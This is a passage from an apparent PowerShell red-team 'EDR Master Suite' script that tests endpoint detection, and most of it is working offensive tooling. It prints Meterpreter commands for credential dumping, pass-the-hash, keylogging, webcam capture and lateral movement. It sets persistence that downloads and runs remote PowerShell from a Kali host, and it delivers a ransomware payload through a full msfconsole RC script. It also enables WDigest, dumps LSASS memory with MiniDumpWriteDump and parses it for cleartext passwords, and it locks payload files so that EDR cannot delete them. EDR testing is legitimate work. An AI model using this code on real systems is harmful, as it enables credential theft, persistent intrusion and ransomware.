                Write-Host "  === KIWI / WDIGEST CREDENTIAL DUMP ===" -ForegroundColor Yellow
                Write-Host "  meterpreter > load kiwi" -ForegroundColor Cyan
                Write-Host "  meterpreter > creds_all" -ForegroundColor Cyan
                Write-Host "  meterpreter > lsa_dump_sam" -ForegroundColor Cyan
                Write-Host "  meterpreter > lsa_dump_secrets" -ForegroundColor Cyan
                Write-Host "  meterpreter > wifi_list" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  Look for WDigestTest : LabPassword123!" -ForegroundColor Red
                Write-Host "  MITRE: T1003 OS Credential Dumping" -ForegroundColor DarkGray
                Log-Result "T1003" "Kiwi credential dump commands generated" "EXECUTED" "load kiwi + creds_all + lsa_dump"
            }

            "4" {
                Write-Host ""
                Write-Host "  === HASHDUMP (SAM) ===" -ForegroundColor Yellow
                Write-Host "  meterpreter > hashdump" -ForegroundColor Cyan
                Write-Host "  # Offline crack on Kali:" -ForegroundColor DarkGray
                Write-Host "  john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt" -ForegroundColor Cyan
                Write-Host "  hashcat -m 1000 hashes.txt rockyou.txt" -ForegroundColor Cyan
                Write-Host "  # Pass-the-Hash:" -ForegroundColor DarkGray
                Write-Host "  pth-winexe -U 'user%HASH' //TARGET cmd.exe" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1003.002 SAM Credential Dump" -ForegroundColor DarkGray
                Log-Result "T1003.002" "Hashdump commands generated" "EXECUTED" "hashdump + john + hashcat + PTH"
            }

            "5" {
                Write-Host ""
                Write-Host "  === SCREENSHOT + KEYLOGGER ===" -ForegroundColor Yellow
                Write-Host "  meterpreter > screenshot" -ForegroundColor Cyan
                Write-Host "  meterpreter > keyscan_start" -ForegroundColor Cyan
                Write-Host "  # Wait 30 seconds..." -ForegroundColor DarkGray
                Write-Host "  meterpreter > keyscan_dump" -ForegroundColor Cyan
                Write-Host "  meterpreter > keyscan_stop" -ForegroundColor Cyan
                Write-Host "  meterpreter > webcam_list" -ForegroundColor Cyan
                Write-Host "  meterpreter > webcam_snap" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1113 Screenshot | T1056.001 Keylogging" -ForegroundColor DarkGray
                Log-Result "T1113" "Screenshot + keylogger commands generated" "EXECUTED" "screenshot keyscan webcam"
            }

            "6" {
                Write-Host ""
                Write-Host "  === PERSISTENCE ===" -ForegroundColor Yellow
                Write-Host "  # Option 1 -- Registry Run Key:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > reg setval -k HKCU\Software\Microsoft\Windows\CurrentVersion\Run -v WinUpdate -t REG_SZ -d `"powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://$KaliIP/follina.ps1')`"" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # Option 2 -- Startup folder:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > upload /root/follina_demo/persist.bat `"C:\Users\Public\persist.bat`"" -ForegroundColor Cyan
                Write-Host "  meterpreter > execute -f cmd.exe -a `"/c copy C:\Users\Public\persist.bat `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`"`" -H" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # Option 3 -- Scheduled Task:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > execute -f cmd.exe -a `"/c schtasks /create /tn WinUpdate /tr `"powershell -w hidden -ep bypass -c IEX(IWR 'http://$KaliIP/follina.ps1')`" /sc onlogon /f`" -H" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1547 Boot/Logon Autostart Execution" -ForegroundColor DarkGray
                Log-Result "T1547" "Persistence commands generated" "EXECUTED" "RunKey + Startup + SchTask"
            }

            "7" {
                Write-Host ""
                Write-Host "  === RANSOMWARE PAYLOAD ===" -ForegroundColor Yellow
                Write-Host "  # Make sure attack_chain.ps1 is served on Kali:$WebPort" -ForegroundColor DarkGray
                Write-Host "  meterpreter > execute -f powershell.exe -a `"-w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://$KaliIP/attack_chain.ps1')`" -H" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # Or upload and run directly:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > upload /root/follina_demo/attack_chain.ps1 C:\Windows\Temp\ac.ps1" -ForegroundColor Cyan
                Write-Host "  meterpreter > execute -f powershell.exe -a `"-w hidden -ep bypass -File C:\Windows\Temp\ac.ps1`" -H" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1486 Data Encrypted for Impact" -ForegroundColor DarkGray
                Log-Result "T1486" "Ransomware payload commands generated" "EXECUTED" "attack_chain.ps1 via Meterpreter"
            }

            "8" {
                Write-Host ""
                Write-Host "  === LATERAL MOVEMENT ===" -ForegroundColor Yellow
                Write-Host "  # Network discovery:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > run post/multi/gather/ping_sweep RHOSTS=10.0.2.0/24" -ForegroundColor Cyan
                Write-Host "  meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.0.2.0/24" -ForegroundColor Cyan
                Write-Host "  meterpreter > arp" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # SMB lateral movement (after hashdump):" -ForegroundColor DarkGray
                Write-Host "  msf > use exploit/windows/smb/psexec" -ForegroundColor Cyan
                Write-Host "  msf > set SMBUser Administrator" -ForegroundColor Cyan
                Write-Host "  msf > set SMBPass [NTLM_HASH]" -ForegroundColor Cyan
                Write-Host "  msf > set RHOSTS [TARGET_IP]" -ForegroundColor Cyan
                Write-Host "  msf > run" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # Pass-the-Hash with crackmapexec (on Kali):" -ForegroundColor DarkGray
                Write-Host "  crackmapexec smb 10.0.2.0/24 -u Administrator -H [NTLM_HASH]" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1021.002 SMB | T1550.002 Pass-the-Hash" -ForegroundColor DarkGray
                Log-Result "T1021" "Lateral movement commands generated" "EXECUTED" "ping_sweep + psexec + PTH + CME"
            }

            "9" {
                Write-Host ""
                Write-Host "  === UPLOAD + EXECUTE CUSTOM FILE ===" -ForegroundColor Yellow
                Write-Host "  Enter local file path on Kali: " -NoNewline -ForegroundColor White
                $localFile = Read-Host
                Write-Host "  Enter remote path on victim [C:\Windows\Temp\payload.exe]: " -NoNewline -ForegroundColor White
                $remotePath = Read-Host
                if ($remotePath -eq "") { $remotePath = "C:\Windows\Temp\payload.exe" }
                Write-Host ""
                Write-Host "  meterpreter > upload $localFile `"$remotePath`"" -ForegroundColor Cyan
                Write-Host "  meterpreter > execute -f `"$remotePath`" -H" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1105 Ingress Tool Transfer" -ForegroundColor DarkGray
                Log-Result "T1105" "Upload + execute commands generated" "EXECUTED" "upload $localFile -> $remotePath"
            }

            "10" {
                Write-Host ""
                Write-Host "  === RUN EDR MASTER SUITE REMOTELY ===" -ForegroundColor Yellow
                Write-Host "  # Upload edr_master_suite.ps1 to victim and run:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > upload /root/follina_demo/edr_master_suite.ps1 C:\Windows\Temp\edr.ps1" -ForegroundColor Cyan
                Write-Host "  meterpreter > execute -f powershell.exe -a `"-w hidden -ep bypass -File C:\Windows\Temp\edr.ps1`" -i" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  # Or serve via HTTP and run in-memory:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > execute -f powershell.exe -a `"-w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://$KaliIP/edr_master_suite.ps1')`" -i" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  Note: use -i flag for interactive session" -ForegroundColor DarkYellow
                Log-Result "T1059.001" "Remote EDR suite execution commands generated" "EXECUTED" "Upload + execute edr_master_suite.ps1"
            }

            "11" {
                Write-Host ""
                Write-Host "  === CUSTOM COMMAND ===" -ForegroundColor Yellow
                Write-Host "  Enter your custom command: " -NoNewline -ForegroundColor White
                $userCmd = Read-Host
                if ($userCmd -ne "") {
                    Write-Host ""
                    Write-Host "  # Via shell:" -ForegroundColor DarkGray
                    Write-Host "  meterpreter > shell" -ForegroundColor Cyan
                    Write-Host "  C:\> $userCmd" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host "  # Via execute:" -ForegroundColor DarkGray
                    Write-Host "  meterpreter > execute -f cmd.exe -a `"/c $userCmd`" -H -o" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host "  # Via PowerShell:" -ForegroundColor DarkGray
                    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($userCmd))
                    Write-Host "  meterpreter > execute -f powershell.exe -a `"-w hidden -ep bypass -EncodedCommand $b64`" -H -o" -ForegroundColor Cyan
                    Write-Host ""
                    Log-Result "T1059" "Custom command generated" "EXECUTED" "CMD: $userCmd"
                }
            }

            "12" {
                Write-Host ""
                Write-Host "  === FULL POST-EXPLOIT RC SCRIPT ===" -ForegroundColor Yellow
                Write-Host "  Copy this to /root/follina_demo/rhino_post.rc on Kali:" -ForegroundColor White
                Write-Host ""
                $fullRC = @"
# rhino_post.rc -- post-exploitation after Java Rhino session

# Step 1: Recon
sysinfo
getuid
getpwd

# Step 2: Escalate
getsystem
getuid

# Step 3: Credential dump
load kiwi
creds_all
hashdump
lsa_dump_sam

# Step 4: Persistence
reg setval -k HKCU\Software\Microsoft\Windows\CurrentVersion\Run -v WinUpdate -t REG_SZ -d "powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}/follina.ps1')"

# Step 5: Screenshot + keylogger
screenshot
keyscan_start

# Step 6: Ransomware
execute -f powershell.exe -a "-w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}/attack_chain.ps1')" -H

# Step 7: Background session
background
"@
                $fullRC -split "`n" | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
                Write-Host ""
                Write-Host "  Launch: msfconsole -r /root/follina_demo/rhino_post.rc" -ForegroundColor Yellow
                Log-Result "T1059" "Full post-exploit RC script generated" "EXECUTED" "rhino_post.rc"
            }

            "Q" { $continueMenu = $false }

            default {
                Write-Host "  Invalid choice" -ForegroundColor Red
                Start-Sleep -Seconds 1
            }
        }

        if ($postChoice.ToUpper().Trim() -ne "Q" -and $continueMenu) {
            Write-Host ""
            Write-Host "  Press ENTER to continue..." -ForegroundColor DarkCyan
            Read-Host | Out-Null
        }
    }
}


# ============================================================
#  MODULE 2B -- WDIGEST CLEARTEXT CREDENTIAL DEMO
#  Ordre critique: WDigest AVANT le logon
#  T1003 -- OS Credential Dumping via WDigest
# ============================================================

function Test-WDigestDemo {
    Write-Phase "T1003" "WDigest Cleartext Credential Demo" "Red"
    Write-Warn "Critical order: WDigest MUST be enabled BEFORE logon"
    Write-Warn "Wrong: Logon --> WDigest --> dump = HASH only"
    Write-Warn "RIGHT: WDigest --> Logon --> dump = CLEARTEXT password"

    $DemoUser = "svc_falcon_demo"
    $DemoPass = "FalconDemo2024!"
    $Domain   = $env:COMPUTERNAME

    # -- STEP 1: Activer WDigest AVANT tout --
    Write-Host ""
    Write-Detail "STEP 1 -- Enable WDigest BEFORE logon (critical)"
    $wdBefore = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -ErrorAction SilentlyContinue).UseLogonCredential
    Write-Evidence "WDigest BEFORE : $wdBefore"

    Try {
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
            -Name UseLogonCredential -Value 1 -Type DWord -Force -ErrorAction Stop
        $wdAfter = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest").UseLogonCredential
        Write-Evidence "WDigest AFTER  : $wdAfter"
        if ($wdAfter -eq 1) {
            Write-OK "WDigest enabled -- next logon will cache cleartext"
            Log-Result "T1003" "WDigest UseLogonCredential=1" "EXECUTED" "Registry set BEFORE logon"
        } else {
            Write-Fail "WDigest not set"
            Log-Result "T1003" "WDigest enable" "BLOCKED" "Registry write failed"
            return
        }
    } Catch {
        Write-Fail "WDigest set blocked: $($_.Exception.Message)"
        Log-Result "T1003" "WDigest enable" "BLOCKED" $_.Exception.Message
        return
    }

    # -- STEP 2: Creer l utilisateur demo --
    Write-Host ""
    Write-Detail "STEP 2 -- Create demo user AFTER WDigest enabled"
    $existing = Get-LocalUser $DemoUser -ErrorAction SilentlyContinue
    if ($existing) {
        Remove-LocalUser $DemoUser -ErrorAction SilentlyContinue
        Write-Detail "Removed existing user $DemoUser"
    }

    Try {
        $secPass = ConvertTo-SecureString $DemoPass -AsPlainText -Force
        New-LocalUser -Name $DemoUser `
                      -Password $secPass `
                      -FullName "Falcon Demo Service Account" `
                      -Description "WDigest demo -- password visible in LSASS" `
                      -PasswordNeverExpires `
                      -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Users" -Member $DemoUser -ErrorAction SilentlyContinue

        $u = Get-LocalUser $DemoUser
        Write-OK "User created: $DemoUser"
        Write-Evidence "SID         : $($u.SID)"
        Write-Evidence "RID         : $(($u.SID -split '-')[-1])"
        Write-Host ""
        Write-Host "  +------------------------------------------+" -ForegroundColor Red
        Write-Host "  |  TARGET PASSWORD (should appear in LSASS) |" -ForegroundColor Red
        Write-Host "  |  Username : $($DemoUser.PadRight(29))|" -ForegroundColor Yellow
        Write-Host "  |  Password : $($DemoPass.PadRight(29))|" -ForegroundColor Yellow
        Write-Host "  +------------------------------------------+" -ForegroundColor Red
        Log-Result "T1003" "WDigest test user creation" "EXECUTED" "User:$DemoUser Pass:$DemoPass"
    } Catch {
        Write-Fail "User creation failed: $($_.Exception.Message)"
        Log-Result "T1003" "WDigest user creation" "BLOCKED" $_.Exception.Message
        return
    }

    # -- STEP 3: Forcer le logon APRES activation WDigest --
    Write-Host ""
    Write-Detail "STEP 3 -- Force logon AFTER WDigest enabled (populates LSASS cache)"

    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WDigestLogon {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string u, string d, string p, int t, int prov, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    public static string Logon(string user, string domain, string pass, int type) {
        IntPtr token = IntPtr.Zero;
        bool ok = LogonUser(user, domain, pass, type, 0, out token);
        int err = Marshal.GetLastWin32Error();
        if (ok) {
            bool imp = ImpersonateLoggedOnUser(token);
            RevertToSelf();
            CloseHandle(token);
            return "SUCCESS type=" + type + " impersonated=" + imp;
        }
        return "FAILED type=" + type + " err=" + err + " (" +
               (err==1326?"BadCreds":err==5?"AccessDenied":"Unknown") + ")";
    }
}
"@ -ErrorAction SilentlyContinue

    $anySuccess = $false
    foreach ($logonType in @(2, 8, 9)) {
        $label = switch ($logonType) {
            2 { "INTERACTIVE (best for WDigest)" }
            8 { "NETWORK_CLEARTEXT (forces cache)" }
            9 { "NEW_CREDENTIALS" }
        }
        Write-Detail "Type $logonType -- $label"
        Try {
            $r = [WDigestLogon]::Logon($DemoUser, $Domain, $DemoPass, $logonType)
            Write-Evidence "  $r"
            if ($r -match "SUCCESS") { $anySuccess = $true }
        } Catch {
            Write-Evidence "  Type $logonType exception: $($_.Exception.Message)"
        }
        Start-Sleep -Milliseconds 300
    }

    # Fallback cmdkey
    if (-not $anySuccess) {
        Write-Detail "LogonUser failed -- trying cmdkey fallback..."
        $ck = cmdkey /add:$Domain /user:$DemoUser /pass:$DemoPass 2>&1
        Write-Evidence "cmdkey: $ck"
    }

    if ($anySuccess) {
        Write-OK "Logon succeeded -- LSASS cache populated with cleartext"
        Log-Result "T1003" "WDigest logon via LogonUser API" "EXECUTED" "User:$DemoUser creds in LSASS"
    } else {
        Write-Warn "Logon type 2/8 failed -- creds may not be cached"
        Log-Result "T1003" "WDigest logon" "PARTIAL" "LogonUser failed -- cmdkey fallback used"
    }

    # -- STEP 4: LSASS Minidump + parse pypykatz --
    Write-Host ""
    Write-Detail "STEP 4 -- LSASS dump + inline parse"
    $dumpPath = "$env:TEMP\lsass_wd_$(Get-Random).dmp"

    Add-Type -TypeDefinition @"
using System; using System.IO; using System.Diagnostics; using System.Runtime.InteropServices;
public class WDDump {
    [DllImport("dbghelp.dll", SetLastError=true)]
    public static extern bool MiniDumpWriteDump(IntPtr h, uint pid, SafeHandle f, uint t, IntPtr e, IntPtr u, IntPtr c);
    public static string Dump(string path) {
        try {
            Process[] p = Process.GetProcessesByName("lsass");
            if (p.Length == 0) return "NOT_FOUND";
            using (FileStream fs = new FileStream(path, FileMode.Create)) {
                bool ok = MiniDumpWriteDump(p[0].Handle,(uint)p[0].Id,fs.SafeFileHandle,0x00000002,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero);
                return ok ? "OK:" + new FileInfo(path).Length : "BLOCKED:" + Marshal.GetLastWin32Error();
            }
        } catch (Exception e) { return "EX:" + e.Message; }
    }
}
"@ -ErrorAction SilentlyContinue

    Try {
        $dumpResult = [WDDump]::Dump($dumpPath)
        Write-Evidence "Dump result: $dumpResult"

        if ($dumpResult -like "OK:*") {
            $size = ($dumpResult -split ":")[1]
            Write-OK "LSASS dump: $dumpPath ($([math]::Round([int64]$size/1MB,1)) MB)"

            $py = Get-Command python -ErrorAction SilentlyContinue
            if (-not $py) { $py = Get-Command python3 -ErrorAction SilentlyContinue }

            if ($py) {
                $hasPypy = & $py.Source -c "import pypykatz; print('OK')" 2>&1
                if ($hasPypy -match "OK") {
                    Write-OK "pypykatz found -- parsing inline..."

                    $ps = @"
import sys
from pypykatz.pypykatz import pypykatz as ppk
try:
    mimi = ppk.parse_minidump_file(sys.argv[1])
    target = sys.argv[2]
    print("")
    print("=" * 55)
    print("  WDIGEST CLEARTEXT CREDENTIALS")
    print("=" * 55)
    found = False
    for luid, session in mimi.logon_sessions.items():
        for cred in session.wdigest_credentials:
            if cred.username and cred.password:
                marker = " <-- TARGET CLEARTEXT" if cred.username == target else ""
                print(f"  [LUID]     {luid}")
                print(f"  [USER]     {cred.username}{marker}")
                print(f"  [DOMAIN]   {cred.domainname}")
                print(f"  [PASSWORD] {cred.password}{marker}")
                print("")
                found = True
        for cred in session.msv_credentials:
            if cred.username == target and cred.NThash:
                print(f"  [NTLM]  {cred.username} : {cred.NThash.hex()}")
                print(f"  [CRACK] hashcat -m 1000 {cred.NThash.hex()} rockyou.txt")
                print("")
    if not found:
        print("  [!] No WDigest cleartext -- logon may not have been cached")
        print("  --> Try: load kiwi ; creds_all in Meterpreter")
    print("=" * 55)
except Exception as e:
    print(f"Parse error: {e}")
"@
                    $pyFile = "$env:TEMP\wd_parse_$(Get-Random).py"
                    Set-Content $pyFile $ps -Encoding UTF8

                    Write-Host ""
                    Write-Host "  +=============================================+" -ForegroundColor Red
                    Write-Host "  |  WDIGEST LSASS RESULTS                     |" -ForegroundColor Red
                    Write-Host "  +=============================================+" -ForegroundColor Red

                    $out = & $py.Source $pyFile $dumpPath $DemoUser 2>&1
                    $out | ForEach-Object {
                        if ($_ -match "TARGET|PASSWORD") { Write-Host "  $_" -ForegroundColor Red }
                        elseif ($_ -match "USER|DOMAIN|NTLM|CRACK") { Write-Host "  $_" -ForegroundColor Yellow }
                        elseif ($_ -match "===|\+") { Write-Host "  $_" -ForegroundColor Red }
                        elseif ($_ -match "\[!]") { Write-Host "  $_" -ForegroundColor DarkYellow }
                        else { Write-Host "  $_" -ForegroundColor White }
                    }
                    Write-Host "  +=============================================+" -ForegroundColor Red

                    Remove-Item $pyFile -Force -ErrorAction SilentlyContinue
                    Log-Result "T1003.001" "WDigest LSASS dump + pypykatz parse" "EXECUTED" "Target:$DemoUser dump:$dumpPath"
                } else {
                    Write-Warn "pypykatz not installed -- pip install pypykatz"
                    Write-Evidence "Transfer dump: meterpreter > download $dumpPath /root/falcon_demo/lsass.dmp"
                    Write-Evidence "Parse on Kali: pypykatz lsa minidump /root/falcon_demo/lsass.dmp"
                    Log-Result "T1003.001" "LSASS dump (pypykatz not installed)" "PARTIAL" $dumpPath
                }
            } else {
                Write-Warn "Python not found -- use Meterpreter"
                Log-Result "T1003.001" "LSASS dump (no Python)" "PARTIAL" $dumpPath
            }

            Write-Host ""
            Write-OK "Dump kept: $dumpPath"
            Write-Evidence "Meterpreter: download $dumpPath /root/falcon_demo/lsass.dmp"

        } else {
            Write-Fail "LSASS dump BLOCKED: $dumpResult"
            Write-Evidence "CrowdStrike protecting LSASS -- use Meterpreter kiwi instead"
            Log-Result "T1003.001" "LSASS MiniDumpWriteDump" "BLOCKED" $dumpResult
        }
    } Catch {
        Write-Fail "Dump blocked: $($_.Exception.Message)"
        Log-Result "T1003.001" "LSASS dump" "BLOCKED" $_.Exception.Message
    }

    # -- STEP 5: Instructions Meterpreter --
    Write-Host ""
    Write-Host "  === VERIFY IN METERPRETER ===" -ForegroundColor Yellow
    Write-Host "  meterpreter > load kiwi" -ForegroundColor Cyan
    Write-Host "  meterpreter > creds_all" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Expected:" -ForegroundColor White
    Write-Host "  [wdigest] Username : $DemoUser" -ForegroundColor Yellow
    Write-Host "  [wdigest] Domain   : $Domain" -ForegroundColor Yellow
    Write-Host "  [wdigest] Password : $DemoPass    <-- CLEARTEXT" -ForegroundColor Red
    Write-Host ""

    Log-Result "T1003" "WDigest cleartext demo complete" "EXECUTED" "User:$DemoUser Pass:$DemoPass -- check with kiwi"
}

function Show-FinalReport {
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "  EDR MASTER SUITE v$global:Version -- FINAL REPORT" -ForegroundColor Cyan
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""

    $ex = ($global:Results|Where-Object{$_.Status-eq"EXECUTED"}).Count
    $bl = ($global:Results|Where-Object{$_.Status-eq"BLOCKED"}).Count
    $pt = ($global:Results|Where-Object{$_.Status-eq"PARTIAL"}).Count
    $nf = ($global:Results|Where-Object{$_.Status-eq"NOT_FOUND"}).Count
    $tot= $global:Results.Count
    $sc = if ($tot -gt 0) { [math]::Round(($bl/$tot)*100,1) } else { 0 }

    Write-Host "  Host      : $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor White
    Write-Host "  Date      : $(Get-Date -Format 'yyyy-MM-dd HH:mm')" -ForegroundColor White
    Write-Host "  Tests     : $tot" -ForegroundColor White
    Write-Host "  EXECUTED  : $ex  (not blocked)" -ForegroundColor Yellow
    Write-Host "  BLOCKED   : $bl  (EDR detected)" -ForegroundColor Green
    Write-Host "  PARTIAL   : $pt" -ForegroundColor Cyan
    Write-Host "  NOT_FOUND : $nf" -ForegroundColor Gray
    Write-Host ""

    $sc_col = if ($sc -ge 80){"Green"} elseif($sc -ge 50){"Yellow"} else {"Red"}
    Write-Host "  EDR Coverage Score: $sc%" -ForegroundColor $sc_col
    Write-Host ""

    $modules = [ordered]@{
        "1-Recon"        = @("T1082","T1057","T1016")
        "2-Credentials"  = @("T1003","T1555")
        "2B-WDigest"     = @("T1003.001")
        "3-Defenses"     = @("T1562")
        "4-Ransomware"   = @("T1486","T1490","T1041")
        "5-Persistence"  = @("T1547","T1546")
        "6-AMSI"         = @("T1562.001")
        "7-Obfuscation"  = @("T1027")
        "8-LOLBins"      = @("T1218","T1127")
        "9-Injection"    = @("T1055","T1620","T1134")
        "10-BYOVD"       = @("T1068","T1543")
        "11-Sandbox"     = @("T1497")
        "12-Syscalls"    = @("T1068")
        "13-FileLock"    = @("T1222","T1564")
        "14-EICAR"      = @("EICAR")
        "15-JavaRhino"  = @("CVE-2011-3544")
    }

    Write-Host "  Module Coverage:" -ForegroundColor Cyan
    foreach ($m in $modules.GetEnumerator()) {
        $mRes = $global:Results | Where-Object { $t=$_.Technique; $m.Value | Where-Object { $t -like "$_*" } }
        if ($mRes) {
            $mEx = ($mRes|Where-Object{$_.Status-eq"EXECUTED"}).Count
            $mBl = ($mRes|Where-Object{$_.Status-eq"BLOCKED"}).Count
            $col = if($mBl -gt $mEx){"Green"} elseif($mEx -gt 0){"Yellow"} else {"Gray"}
            Write-Host "  $($m.Key.PadRight(18)) EXEC:$mEx BLOCKED:$mBl" -ForegroundColor $col
        }
    }

    Write-Host ""
    $global:Results | Format-Table Technique, Desc, Status, Time -AutoSize

    $csv = "$global:LogDir\master_results_$(Get-Date -Format 'yyyyMMdd_HHmm').csv"
    $global:Results | Export-Csv $csv -NoTypeInformation -Encoding UTF8

    Write-Host "  Log  : $global:LogFile" -ForegroundColor DarkCyan
    Write-Host "  CSV  : $csv" -ForegroundColor DarkCyan
    Write-Host "  Dir  : $global:LogDir" -ForegroundColor DarkCyan
    Write-Host "=============================================" -ForegroundColor Cyan
}

# ============================================================
#  MENU
# ============================================================

# ============================================================
#  MODULE 13 -- FILE SELF-PROTECTION & LOCK
#  Techniques pour empecher la suppression des fichiers par EDR
#  T1222  -- File/Directory Permissions Modification
#  T1564  -- Hide Artifacts (ADS)
#  T1480  -- Execution Guardrails (file lock)
# ============================================================

function Test-FileSelfProtection {
    Write-Phase "T1222/T1564" "File Self-Protection & Anti-Deletion" "Yellow"
    Write-Warn "Goal: prevent EDR from deleting payload files"
    Write-Warn "Technique: open file handles that block deletion"

    $global:FileLocks = @()
    $testDir = "$global:LogDir\filelock_test"
    New-Item -ItemType Directory -Force -Path $testDir | Out-Null

    #  TEST 13A: Self-lock via FileStream 
    Write-Phase "13A" "FileStream Exclusive Lock (FileShare::None)" "Yellow"
    Write-Detail "Technique: open ReadWrite handle with FileShare.None"
    Write-Evidence "IOC: FileStream with FileShare.None -- other processes can't touch the file"

    $lockFile = "$testDir\payload_locked.ps1"
    "Write-Host 'Locked payload'" | Set-Content $lockFile
    Write-Evidence "Created test file: $lockFile"

    Try {
        $stream1 = [System.IO.File]::Open(
            $lockFile,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::ReadWrite,
            [System.IO.FileShare]::None
        )
        $global:FileLocks += $stream1
        Write-OK "FileStream opened with FileShare.None"
        Write-Evidence "Handle ID : $($stream1.SafeFileHandle.DangerousGetHandle())"
        Write-Evidence "Can read  : $($stream1.CanRead)"
        Write-Evidence "Can write : $($stream1.CanWrite)"

        # Tenter de supprimer le fichier verrouille
        Write-Detail "Attempting to delete the locked file..."
        Try {
            Remove-Item $lockFile -Force -ErrorAction Stop
            Write-Fail "File was deleted despite lock -- EDR may have closed the handle"
            Log-Result "T1222" "FileStream exclusive lock" "BLOCKED" "File deleted by EDR despite lock"
        } Catch {
            Write-OK "DELETE FAILED -- file is protected by FileStream lock"
            Write-Evidence "Error: $($_.Exception.Message)"
            Log-Result "T1222" "FileStream exclusive lock (FileShare.None)" "EXECUTED" "File deletion blocked by open handle"
        }

        # Tenter de modifier le fichier depuis un autre contexte
        Write-Detail "Attempting to overwrite the locked file..."
        Try {
            "malicious content" | Set-Content $lockFile -ErrorAction Stop
            Write-Fail "File was overwritten despite lock"
            Log-Result "T1222" "FileStream write protection" "BLOCKED" "File overwritten"
        } Catch {
            Write-OK "OVERWRITE FAILED -- file content protected"
            Write-Evidence "Error: $($_.Exception.Message)"
            Log-Result "T1222" "FileStream write protection" "EXECUTED" "Overwrite blocked by handle"
        }
    } Catch {
        Write-Fail "Could not open FileStream: $($_.Exception.Message)"
        Log-Result "T1222" "FileStream exclusive lock" "BLOCKED" $_.Exception.Message
    }

    #  TEST 13B: Self-locking script 
    Write-Host ""
    Write-Phase "13B" "Script Self-Lock (payload locks itself)" "Yellow"
    Write-Detail "Technique: script opens a handle on itself at startup"
    Write-Evidence "IOC: process holding handle on its own .ps1 file"

    $selfPath = $MyInvocation.MyCommand.Path
    if ($selfPath -and (Test-Path $selfPath)) {
        Try {
            $selfStream = [System.IO.File]::Open(
                $selfPath,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::Read
            )
            $global:FileLocks += $selfStream
            Write-OK "Script is now self-locked"
            Write-Evidence "Script path : $selfPath"
            Write-Evidence "Handle      : $($selfStream.SafeFileHandle.DangerousGetHandle())"
            Write-Evidence "File size   : $($selfStream.Length) bytes"

            Write-Detail "Attempting to delete the running script..."
            Try {
                Remove-Item $selfPath -Force -ErrorAction Stop
                Write-Fail "Script deleted -- not protected"
                Log-Result "T1222" "Script self-lock" "BLOCKED" "Script was deleted"
            } Catch {
                Write-OK "Script cannot be deleted while running"
                Write-Evidence "Error: $($_.Exception.Message)"
                Log-Result "T1222" "Script self-lock" "EXECUTED" "Script protected by self-handle"
            }
        } Catch {
            Write-Fail "Self-lock failed: $($_.Exception.Message)"
            Log-Result "T1222" "Script self-lock" "BLOCKED" $_.Exception.Message
        }
    } else {
        Write-Warn "Script path not available (running from stdin/pipeline)"
        Log-Result "T1222" "Script self-lock" "NOT_FOUND" "No script path (stdin mode)"
    }

    #  TEST 13C: Background job lock (persiste apres fin du script) 
    Write-Host ""
    Write-Phase "13C" "Background Job Lock (persistent handle)" "Yellow"
    Write-Detail "Technique: spawn background job that holds the lock indefinitely"
    Write-Evidence "IOC: background PS job maintaining file handle -- survives main script"

    $bgLockFile = "$testDir\payload_bg_locked.ps1"
    "Write-Host 'Background locked payload'" | Set-Content $bgLockFile

    $lockJob = Start-Job -ScriptBlock {
        param($path)
        try {
            $s = [System.IO.File]::Open(
                $path,
                [System.IO.FileMode]::Open,
